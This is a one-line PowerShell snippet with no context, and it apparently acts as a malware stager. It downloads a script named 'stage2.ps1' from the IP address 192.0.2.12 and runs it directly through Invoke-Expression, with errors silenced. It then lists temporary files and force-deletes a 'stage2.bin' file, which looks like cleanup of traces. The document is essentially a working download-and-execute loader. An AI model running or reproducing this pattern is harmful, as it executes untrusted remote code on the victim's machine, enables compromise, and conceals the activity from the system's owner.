
$TransferUrl = 'http://192.0.2.12/stage2.ps1'; IEX (Invoke-WebRequest -Uri $TransferUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
